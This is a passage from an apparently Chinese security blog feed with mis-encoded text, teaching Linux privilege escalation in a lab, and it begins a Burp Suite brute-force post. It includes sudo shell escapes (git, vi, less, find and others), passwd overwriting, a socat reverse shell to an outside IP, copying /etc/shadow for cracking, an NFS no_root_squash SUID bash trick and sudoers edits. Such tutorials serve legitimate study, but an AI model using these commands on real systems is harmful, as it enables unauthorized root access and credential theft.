class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure><p>4ã€ä½¿ç”¨ddè¦†ç›–åŸå§‹passwdæ–‡ä»¶</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hh</span>@hh:/tmp$ cat passwd|sudo dd of=/etc/passwd </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records in </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records out</span><br><span class="line"><span class="attribute">1757</span> bytes (<span class="number">1</span>.<span class="number">8</span> kB, <span class="number">1</span>.<span class="number">7</span> KiB) copied, <span class="number">0</span>.<span class="number">000397129</span> s, <span class="number">4</span>.<span class="number">4</span> MB/s</span><br></pre></td></tr></table></figure><p>5ã€ä½¿ç”¨åˆšæ‰åˆ›å»ºhashæ—¶ä½¿ç”¨çš„å¯†ç è¿›è¡Œç™»å½•</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="variable">$su</span> root</span><br><span class="line"><span class="symbol">Password:</span></span><br><span class="line">root<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>ææƒæˆåŠŸï¼</p><h4 id="GIT"><a href="#GIT" class="headerlink" title="*GIT"></a>*GIT</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥sudo -l</span><br><span class="line"><span class="regexp">//</span>åˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Linux-PowerUp/image-20220901112624228.png" alt="image-20220901112624228"></p><p><strong><u>å°±å¯ä»¥å‘ç°<code>root</code>ä»¥<code>nopasswd</code>ã€ä¸éœ€è¦å¯†ç ã€‘è¿è¡Œgitå‘½ä»¤</u></strong></p><p>åŸç†æ˜¯gitå­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ï¼Œ</p><p>åœ¨ä½¿ç”¨</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure><p>ä¸éœ€è¦è¾“å…¥rootå¯†ç ï¼Œå³å¯ä»¥rootèº«ä»½æ‰§è¡Œè¿™æ¡å‘½ä»¤</p><p>æ“ä½œå¦‚ä¸‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p     </span><br><span class="line"><span class="regexp">//</span>-pæ˜¯åˆ†é¡µæŸ¥çœ‹ï¼Œè¿™ä¸ªåŸç†å°±æ˜¯ç»ˆç«¯çš„çª—å£å¤§å°ä¸å¤Ÿæ˜¾ç¤ºï¼Œæ‰€ä»¥ä¸‹æ–¹ä¼šå‡ºç°å†’å·ï¼Œç­‰å¾…è¾“å…¥å‘½ä»¤</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å¯ä»¥çœ‹çœ‹åŒºåˆ«</p><h5 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="*æ³¨æ„"></a>*æ³¨æ„</h5><h6 id="1-çª—å£è¶³å¤Ÿå¤§"><a href="#1-çª—å£è¶³å¤Ÿå¤§" class="headerlink" title="1.çª—å£è¶³å¤Ÿå¤§"></a>1.çª—å£è¶³å¤Ÿå¤§</h6><p><img src="/2023/02/13/Linux-PowerUp/image-20220901113721300.png" alt="image-20220901113721300"></p><p>å¯ä»¥çœ‹åˆ°æ˜¾ç¤ºå®Œäº†ï¼Œå°±æœ‰å›åˆ°åŸå¤„äº†</p><h6 id="2-çª—å£å°ä¸€äº›"><a href="#2-çª—å£å°ä¸€äº›" class="headerlink" title="2.çª—å£å°ä¸€äº›"></a>2.çª—å£å°ä¸€äº›</h6><p><img src="/2023/02/13/Linux-PowerUp/image-20220901113851826.png" alt="image-20220901113851826"></p><p>ä¸‹æ–¹å°±æ˜¾ç¤ºå‡º:ï¼Œç­‰å¾…è¾“å…¥</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">**:æ˜¯è‡ªå¸¦æœ‰çš„ï¼Œä¸æ˜¯è¾“å…¥çš„</span><br><span class="line">:!/bin/sh    //æ„Ÿå¹å·!æ˜¯shellè½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥è¦é¿å…sudoæˆæƒç”¨æˆ·ä½¿ç”¨viï¼Œvimï¼Œftpï¼Œleeï¼Œmoreï¼Œgit</span><br><span class="line">è¿›å…¥root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">å½“ç„¶ä¹Ÿå¯ä»¥æ‰§è¡Œ:!passwd root</span><br><span class="line">ä¿®æ”¹å…¶å¯†ç </span><br><span class="line">ç„¶åsu rootç™»å½•ä¹Ÿå¯</span><br></pre></td></tr></table></figure><h5 id="1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"><a href="#1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell" class="headerlink" title="1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"></a>1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell</h5><p><code>$</code>å˜æˆ<code>#</code>æˆåŠŸ</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901114902493.png" alt="image-20220901114902493"></p><h5 id="2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•"><a href="#2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•" class="headerlink" title="2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•"></a>2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•</h5><p><img src="/2023/02/13/Linux-PowerUp/image-20220901114453769.png" alt="image-20220901114453769"></p><p><code>$</code>å˜æˆ<code>#</code>ï¼ŒæˆåŠŸç™»å½•</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901114726423.png" alt="image-20220901114726423"></p><h4 id="å…¶ä»–å‘½ä»¤"><a href="#å…¶ä»–å‘½ä»¤" class="headerlink" title="å…¶ä»–å‘½ä»¤"></a><strong>å…¶ä»–å‘½ä»¤</strong></h4><p>ä¹Ÿæœ‰å¾ˆå¤šå…¶ä»–å‘½ä»¤å¯ä»¥ç”¨æ¥ææƒï¼Œå’Œä¹‹å‰çš„SUIDææƒä¸­è¯´çš„å‘½ä»¤ç±»ä¼¼ï¼Œä¾‹å¦‚sudoå…è®¸findå‘½ä»¤ï¼Œåˆ™å¯ä»¥é€šè¿‡execå‚æ•°æ¥åˆ‡æ¢åˆ°rootæƒé™ã€‚</p><p>è¿™é‡Œæ·»åŠ æ–°ç”¨æˆ·aaaï¼Œå¹¶ä¿®æ”¹sudoersæ–‡ä»¶ï¼Œå…è®¸éƒ¨åˆ†å‘½ä»¤ï¼Œå†…å®¹å¦‚ä¸‹ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa  ALL=(ALL:ALL) <span class="regexp">/usr/</span>bin<span class="regexp">/find,/u</span>sr<span class="regexp">/bin/</span>perl,<span class="regexp">/usr/</span>bin<span class="regexp">/python3,/u</span>sr<span class="regexp">/bin/</span>less,<span class="regexp">/usr/</span>bin<span class="regexp">/awk,/u</span>sr<span class="regexp">/bin/m</span>an,<span class="regexp">/usr/</span>bin/vi</span><br></pre></td></tr></table></figure><p>è¿™æ—¶aaaç”¨æˆ·ä½¿ç”¨sudoå°±åªèƒ½æ‰§è¡Œé…ç½®å¥½çš„å‘½ä»¤ï¼Œsudo suå’Œsudo bashè¢«ç¦æ­¢æ‰§è¡Œã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224325691.png" alt="image-20220901224325691"></p><p>ç›¸å…³å‘½ä»¤ææƒæ–¹å¼å¦‚ä¸‹ï¼š</p><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><blockquote><p><code>exec</code>å‚æ•°ç”¨æ¥æŒ‡å®šæœç´¢ç»“æœçš„å¤„ç†å‘½ä»¤ï¼Œéœ€è¦ä»¥åˆ†å·ç»“å°¾ï¼Œåˆ†å·åœ¨å‘½ä»¤è¡Œæœ‰ç‰¹æ®Šå‡½æ•°ï¼Œè¦ç”¨<code>\</code>è¿›è¡Œè½¬ä¹‰ã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224342169.png" alt="image-20220901224342169"></p><h5 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h5><blockquote><p><code>e</code>å‚æ•°ç”¨æ¥æŒ‡å®šè¦è¿è¡Œçš„å‘½ä»¤ï¼Œç„¶åä½¿ç”¨<code>linux</code>çš„<code>exec</code>å‚æ•°æ¥è°ƒç”¨<code>bash</code>ã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224356163.png" alt="image-20220901224356163"></p><h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><blockquote><p><code>c</code>å‚æ•°å¯ä»¥åœ¨å‘½ä»¤è¡Œæ‰§è¡Œ<code>python</code>ä»£ç ï¼Œ<code>pty</code>åº“æ˜¯ä¸€ä¸ªä¼ªç»ˆç«¯åº“ï¼Œå®ƒçš„<code>spawn</code>ä¼šè°ƒç”¨æŒ‡å®šçš„ç¨‹åºã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224409127.png" alt="image-20220901224409127"></p><h5 id="less"><a href="#less" class="headerlink" title="less"></a>less</h5><blockquote><p>è¾“å…¥<code>sudo less /etc/hosts</code>å‘½ä»¤æµè§ˆæ–‡ä»¶å†…å®¹æ—¶ï¼Œåˆ°åº•éƒ¨è¾“å…¥<code>!bash</code>åå›è½¦ï¼Œä¼šè·å¾—ä¸€ä¸ª<code>root</code>æƒé™çš„<code>shell</code>ã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224420552.png" alt="image-20220901224420552"></p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224511943.png" alt="image-20220901224511943"></p><h5 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h5><blockquote><p>é€šè¿‡è°ƒç”¨linuxçš„systemå‡½æ•°æ¥æ‰“å¼€bashã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224431624.png" alt="image-20220901224431624"></p><h5 id="man"><a href="#man" class="headerlink" title="man"></a>man</h5><blockquote><p>é€šè¿‡sudo man manå‘½ä»¤æ¥æ‰“å¼€mançš„ä½¿ç”¨æ‰‹å†Œï¼ŒåŒæ—¶ä¼šè¿›å…¥ç¼–è¾‘è¡Œï¼Œè¾“å…¥!bashå›è½¦ï¼Œå¯è·å–rootæƒé™ã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224541655.png" alt="image-20220901224541655"></p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224551402.png" alt="image-20220901224551402"></p><h5 id="vi"><a href="#vi" class="headerlink" title="*vi"></a>*vi</h5><blockquote><p><code>sudo vi</code>ä¼šè¿›å…¥vié»˜è®¤é¡µï¼Œè¾“å…¥<code>:!bash</code>å›è½¦ï¼Œå¯è¿›å…¥<code>root</code>å‘½ä»¤è¡Œã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224609706.png" alt="image-20220901224609706"></p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224622369.png" alt="image-20220901224622369"></p><h5 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h5><blockquote><p>å¦‚æœsudoerså®šä¹‰äº†å¯ä»¥æ‰§è¡ŒæŸä¸ªè„šæœ¬ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥æŠŠè¿”å›shellçš„ä»£ç æ·»åŠ è¿›å»ã€‚</p></blockquote><p>ä¾‹å¦‚æ¡Œé¢æœ‰ä¸ªè¿ç»´éœ€è¦çš„aaa.shæ–‡ä»¶ï¼Œæˆ‘ä»¬æ·»åŠ ä¸€æ®µæ‰“å¼€bashçš„ä»£ç ï¼Œç„¶åsudoè¿è¡Œå³å¯ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224639423.png" alt="image-20220901224639423"></p><p>å‚è€ƒä»£ç ï¼š</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901224909264.png" alt="image-20220901224909264"></p><h4 id="åº”ç”¨ç¨‹åº"><a href="#åº”ç”¨ç¨‹åº" class="headerlink" title="åº”ç”¨ç¨‹åº"></a><strong>åº”ç”¨ç¨‹åº</strong></h4><blockquote><p>é™¤äº†ä¸Šé¢çš„ä¸€äº›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸€äº›åº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥è·å–rootæƒé™ï¼Œä¾‹å¦‚envã€ftpã€socatã€scpã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901225004858.png" alt="image-20220901225004858"></p><h5 id="env"><a href="#env" class="headerlink" title="env"></a>env</h5><blockquote><p>é€šè¿‡envç¯å¢ƒå˜é‡æ¥è·å–rootæƒé™ã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901225022285.png" alt="image-20220901225022285"></p><h5 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h5><blockquote><p>é€šè¿‡ftpæ¥è¿›å…¥bashè·å–rootæƒé™ã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901225031965.png" alt="image-20220901225031965"></p><h5 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h5><blockquote><p>é€šè¿‡socatå®¢æˆ·ç«¯è¿æ¥æ”»å‡»æœºï¼Œæ”»å‡»æœºå¯è·å¾—rootshellã€‚å…ˆæ‰§è¡ŒæœåŠ¡ç«¯ï¼Œåæ‰§è¡Œå®¢æˆ·ç«¯ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo socat <span class="built_in">exec</span>:<span class="string">&#x27;sh -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">æ”»å‡»æœºæ‰§è¡Œï¼š</span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Linux-PowerUp/image-20220901225047468.png" alt="image-20220901225047468"></p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901225056003.png" alt="image-20220901225056003"></p><h5 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h5><blockquote><p>è¿˜æœ‰ä¸€ä¸ªscpï¼Œscpæ˜¯ä¸€ä¸ªå®‰å…¨å¤åˆ¶æ–‡ä»¶çš„å‘½ä»¤ï¼Œå®ƒæ— æ³•è·å–ä¸€ä¸ªshellï¼Œä½†å¯ä»¥ç”¨æ¥å¤åˆ¶ä¸€äº›ç³»ç»Ÿçš„æ•æ„Ÿæ–‡ä»¶ã€‚ä¾‹å¦‚etc&#x2F;passwdã€etc&#x2F;shadowç­‰ã€‚</p><p>å¦‚ä¸‹å‘½ä»¤ï¼Œå°†passwdæ–‡ä»¶ä¼ è¾“åˆ°æŒ‡å®šæœºå™¨çš„root&#x2F;Desktopä¸‹ï¼Œç„¶åå†å¯¹å¯†ç è¿›è¡Œç ´è§£ç­‰æ“ä½œã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901225110501.png" alt="image-20220901225110501"></p><h4 id="é»‘åå•æƒ…å†µ"><a href="#é»‘åå•æƒ…å†µ" class="headerlink" title="é»‘åå•æƒ…å†µ"></a><strong>é»‘åå•æƒ…å†µ</strong></h4><blockquote><p>å¦‚æœç¢°åˆ°sudoersæ–‡ä»¶ä½¿ç”¨é»‘åå•çš„æƒ…å†µï¼Œæ¯”å¦‚è¯´æƒé™ç¦ç”¨sudoä½¿ç”¨findå‘½ä»¤ï¼Œä½†æ˜¯éƒ½æ˜¯åœ¨ALLåŸºç¡€ä¸Šè®¾ç½®çš„ï¼Œé‚£ä¹ˆå¯ä»¥cpæŠŠfindå¤åˆ¶åˆ°å…¶å®ƒç›®å½•è¿è¡Œã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901225127772.png" alt="image-20220901225127772"></p><h2 id="3-NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ"><a href="#3-NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ" class="headerlink" title="3) NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ"></a>3) NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ</h2><h3 id="NFSä»‹ç»"><a href="#NFSä»‹ç»" class="headerlink" title="NFSä»‹ç»"></a>NFSä»‹ç»</h3><blockquote><p>NFSæ˜¯network file systemç¼©å†™ï¼Œç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œç”¨æ¥æŒ‚åœ¨æŸä¸ªç›®å½•æˆ–æ–‡ä»¶è¿›è¡Œå…±äº«ï¼Œé»˜è®¤æ˜¯2049ç«¯å£ï¼ŒåŠŸèƒ½ç±»ä¼¼äºwindowsçš„å…±äº«ã€‚</p></blockquote><p>è¿™é‡Œä»¥ubuntuä¸ºä¾‹ï¼Œç®€å•é…ç½®ä¸€ä¸‹ï¼š</p><p>é¦–å…ˆå®‰è£…nfsæœåŠ¡ç«¯ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install nfs-kernel-<span class="keyword">server</span></span><br></pre></td></tr></table></figure><p>å®‰è£…åä¿®æ”¹é…ç½®æ–‡ä»¶&#x2F;etc&#x2F;exportsï¼Œè¿™é‡Œå°†homeç›®å½•è¿›è¡ŒæŒ‚è½½å…±äº«ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home *(rw,no_root_squash)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­&#x2F;homeæ˜¯è¦æŒ‚è½½çš„ç›®å½•ï¼Œ*ä»£è¡¨å…è®¸è¿æ¥çš„ä¸»æœºï¼Œè¿™é‡Œæ˜¯æ‰€æœ‰ï¼Œrwæ˜¯è¯»å†™æƒé™ï¼Œno_root_squashä»£è¡¨å®¢æˆ·ç«¯å…è®¸ä»¥rootæƒé™è®¿é—®nfsã€‚</p><p>éšåé‡å¯ç›¸å…³æœåŠ¡ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nfsé€šè¿‡rpcé€šä¿¡ï¼Œè¿™é‡ŒæŠŠrpcbindä¹Ÿé‡å¯ä¸‹sudo <span class="regexp">/etc/i</span>nit.d<span class="regexp">/rpcbind restartsudo /</span>etc<span class="regexp">/init.d/</span>nfs-kernel-server restart</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å°±é…ç½®å¥½äº†ï¼Œå¯ä»¥é€šè¿‡showmountå‘½ä»¤æ¥åˆ—å‡ºç›®æ ‡æœºçš„å…±äº«ç›®å½•ï¼Œeå‚æ•°æ˜¾ç¤ºNFSæœåŠ¡å™¨çš„è¾“å‡ºæ¸…å•ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231323392.png" alt="image-20220901231323392"></p><p>æˆ–è€…é€šè¿‡nmapçš„ç›¸å…³è„šæœ¬æ¥è¿›è¡Œæ‰«æã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231334381.png" alt="image-20220901231334381"></p><h3 id="NFSé…ç½®ä¸å½“å¯ææƒ"><a href="#NFSé…ç½®ä¸å½“å¯ææƒ" class="headerlink" title="NFSé…ç½®ä¸å½“å¯ææƒ"></a><strong>NFSé…ç½®ä¸å½“å¯ææƒ</strong></h3><blockquote><p>å½“nfsé…ç½®äº†è¯»å†™æƒé™ï¼Œä¸”å…è®¸å®¢æˆ·ç«¯ä»¥rootè®¿é—®æ—¶ï¼Œå°±ä¼šå­˜åœ¨å®‰å…¨éšæ‚£ã€‚</p></blockquote><p>æµ‹è¯•å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆå®¢æˆ·ç«¯æŠŠç›®æ ‡æœºnfsçš„å…±äº«æŒ‚è½½åˆ°æœ¬åœ°ï¼Œç„¶åæŠŠbashå¤åˆ¶è¿›å»å¹¶èµ‹äºˆsuidæƒé™ï¼Œæ“ä½œå¦‚ä¸‹å›¾ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231351979.png" alt="image-20220901231351979"></p><p>æ­¤æ—¶ç›®æ ‡æœºçš„homeç›®å½•ä¸‹å°±ä¼šæœ‰ä¸€ä¸ªå…·æœ‰suidæƒé™çš„bashã€‚</p><p>æ™®é€šç”¨æˆ·æ‰§è¡Œå³å¯è·å–rootæƒé™ï¼Œè¿™é‡Œæ³¨æ„éœ€è¦åŠ ä¸Š<code>p</code>å‚æ•°ï¼Œå¦åˆ™æƒé™è¿˜æ˜¯å½“å‰ç”¨æˆ·çš„ã€‚</p><p><code>p</code>å‚æ•°è¯´æ˜ï¼šä¸æä¾›çš„æƒ…å†µä¸‹ï¼Œæ‰“å¼€bashæƒé™æ˜¯å½“å‰å®é™…ç”¨æˆ·ï¼Œæä¾›çš„æƒ…å†µä¸‹ï¼Œä¼šæ‰“å¼€ç‰¹æƒæ¨¡å¼ï¼Œåƒä¸Šç»§æ‰¿<code>suid</code>ï¼Œå› ä¸ºbashæœ‰<code>suid</code>æƒé™ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯rootã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231410196.png" alt="image-20220901231410196"></p><p>ä½¿ç”¨åœºæ™¯ï¼šè¿™ä¸ªå’Œ<code>suid</code>ææƒå¾ˆåƒï¼Œç»™ç¨‹åºèµ‹äºˆ<code>suid</code>æƒé™ç„¶ååˆ©ç”¨ã€‚ä¸åŒçš„æ˜¯å‰ä¸¤ç¯‡<code>suid</code>ææƒæ˜¯å½“å‰ç”¨æˆ·ä½¿ç”¨<code>sudo  chmod</code>è‡ªå·±ä¿®æ”¹çš„ï¼Œåœ¨<code>sudoers</code>ç¦ç”¨<code>sudo</code>å‘½ä»¤ç­‰æƒ…å†µä¸‹ï¼Œå°±è¡Œä¸é€šäº†ã€‚è€Œ<code>nfs</code>é…ç½®åˆ©ç”¨ï¼Œæ˜¯å®¢æˆ·ç«¯æŒ‚è½½åˆ°æœ¬åœ°èµ‹æƒçš„ï¼Œç›®æ ‡æœºçš„æ™®é€šç”¨æˆ·åªéœ€æ‰§è¡Œå°±å¯ä»¥ã€‚</p><p>åŒç†ï¼Œä¹‹å‰æ€»ç»“çš„<code>suid</code>ææƒçš„é‚£äº›ç¨‹åºä¹ŸåŒæ ·é€‚ç”¨ï¼Œè¿™é‡Œå°±ä¸å†è®°äº†ã€‚</p><h3 id="å…¶å®ƒå‘½ä»¤"><a href="#å…¶å®ƒå‘½ä»¤" class="headerlink" title="å…¶å®ƒå‘½ä»¤"></a><strong>å…¶å®ƒå‘½ä»¤</strong></h3><p>é™¤äº†å¯ä»¥ç›´æ¥å¾—åˆ°<code>shell</code>çš„ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›ç¨‹åºä¸èƒ½ç›´æ¥è·å–ï¼Œä¾‹å¦‚<code>nanoã€vi</code>ç­‰ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231423093.png" alt="image-20220901231423093"></p><p>ç„¶åä½¿ç”¨<code>nano -p</code>æ¥è¯»å–<code>shadow</code>æ–‡ä»¶ï¼Œè¿™é‡Œè¯»å–æ—¶æŠŠç›¸å…³è®°å½•å¤åˆ¶å‡ºæ¥ï¼Œä½¿ç”¨<code>john</code>ç ´è§£ï¼Œæµ‹è¯•ä¸èƒ½é‡å®šå‘ï¼Œéœ€è¦æƒé™ï¼Œæ‰€ä»¥åªèƒ½å¤åˆ¶ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231435125.png" alt="image-20220901231435125"></p><p>å¤åˆ¶åä½¿ç”¨<code>john</code>ç ´è§£è·å–ç›¸å…³ç”¨æˆ·å¯†ç ï¼Œä»¥<code>root</code>ä¸ºä¾‹ï¼Œå¯†ç æ˜¯<code>root</code>ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231451129.png" alt="image-20220901231451129"></p><p>å¦‚æœå¯†ç å¤ªå¤æ‚ï¼Œç ´è§£ä¸äº†ï¼Œåˆ™å¯ä»¥å°è¯•å…¶å®ƒç”¨æˆ·ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œç›®æ ‡æœºæ˜¯<code>aaa</code>ç”¨æˆ·ï¼Œç ´è§£<code>aaa</code>å¯†ç ä¸º<code>aaa</code>ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231505353.png" alt="image-20220901231505353"></p><p>è¿™æ—¶å€™ä¸ç¡®å®š<code>aaa</code>æ˜¯å¦ä¸º<code>root</code>æƒé™ï¼Œåˆ™å¯ä»¥ç»§ç»­ä½¿ç”¨<code>nano</code>å»ç¼–è¾‘<code>passwd</code>æ–‡ä»¶ï¼Œç»™<code>aaa</code>èµ‹æƒã€‚</p><p>æŠŠåŸæ¥çš„<code>1001</code>æ¢æˆ<code>0</code>.</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231516388.png" alt="image-20220901231516388"></p><p>ç„¶ååˆ‡æ¢<code>aaa</code>ç”¨æˆ·å³å¯ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231524654.png" alt="image-20220901231524654"></p><p>åˆ©ç”¨è¿™ç§æœºåˆ¶ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ä¿®æ”¹<code>sudoers</code>æ–‡ä»¶ï¼Œæ·»åŠ æˆ–ä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ã€‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa     <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) NOPASSWD:<span class="keyword">ALL</span></span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨<code>sudo bash</code>æˆ–<code>sudo su</code>è·å–<code>root</code>æƒé™ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901231537204.png" alt="image-20220901231537204"></p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuiteå¯†ç çˆ†ç ´</title>
      <link href="/2023/02/13/bp-bruce/"/>
      <url>/2023/02/13/bp-bruce/</url>
      
        <content type="html"><![CDATA[<h1 id="Burpsuiteå¯†ç çˆ†ç ´"><a href="#Burpsuiteå¯†ç çˆ†ç ´" class="headerlink" title="Burpsuiteå¯†ç çˆ†ç ´"></a>Burpsuiteå¯†ç çˆ†ç ´</h1><p>è™½ç„¶ä¸çŸ¥é“è¿™ä¸ªç½‘ç«™æ˜¯é‚£ä½å¤§ä½¬æ€»ç»“å»ºç«‹çš„ï¼Œä½†è¿˜æ˜¯å¾ˆæ„Ÿè°¢ï¼ŒèŠ‚çœå¾ˆå¤šæ—¶é—´ï¼Œè¿™ä¸ªç½‘ç«™æä¾›äº†å¾ˆå…¨é¢çš„å¯†ç è¡¨</p><blockquote><p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p></blockquote><p>ä¹‹å‰åœ¨å­¦ä¹ burpsuiteçš„æ—¶å€™ï¼Œå¤§éƒ¨åˆ†æ—¶é—´åœ¨ç”¨proxyå’Œrequestï¼Œä¸€ç›´æƒ³ç”¨intruderï¼Œåœ¨åšåŠŸé˜²ä¸–ç•Œweak_authè¿™é“é¢˜æ—¶ï¼Œéœ€è¦ç”¨å­—å…¸çˆ†ç ´</p><p>äºæ˜¯æˆ‘ä¾¿äº†è§£äº†ä¸€ä¸‹è¿™ä¸ªåŠŸèƒ½</p><blockquote><p>åœ¨intruderä¸‹ï¼Œä¸»è¦çœ‹payload</p><p>payload Setsä¸»è¦ç”¨Simple listå’ŒBrute forcer</p></blockquote><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="1-Simple-list"><a href="#1-Simple-list" class="headerlink" title="1.Simple list"></a>1.Simple list</h3><p>ä¸»è¦å°±æ˜¯è®²å†™å¥½çš„å¯†ç åˆ—è¡¨æŒ¨ä¸ªè¿›è¡Œæµ‹è¯•ï¼Œè¯•å‡ºå¯ä»¥æ­£ç¡®ç™»å½•çš„å¯†ç </p><p><img 